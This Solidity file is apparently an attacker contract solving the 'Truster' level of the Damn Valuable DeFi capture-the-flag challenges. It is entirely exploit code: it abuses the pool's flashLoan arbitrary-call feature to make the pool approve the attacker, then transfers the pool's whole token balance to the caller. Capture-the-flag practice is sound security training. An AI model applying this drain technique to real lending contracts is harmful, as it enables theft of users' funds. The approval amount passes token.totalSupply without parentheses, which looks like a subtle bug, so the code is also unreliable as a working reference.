// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "../DamnValuableToken.sol";

contract AttackTruster {
    DamnValuableToken public token;
    TrusterLenderPool victim;

    constructor(address _victim, DamnValuableToken _token) {
        victim = TrusterLenderPool(_victim);
        token = _token;
    }

    function attack() public returns (bool) {
        victim.flashLoan(
            0,
            address(this),
            address(token),
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                token.totalSupply
            )
        );

        token.transferFrom(address(victim), msg.sender, token.balanceOf(address(victim)));

        return true;
    }
}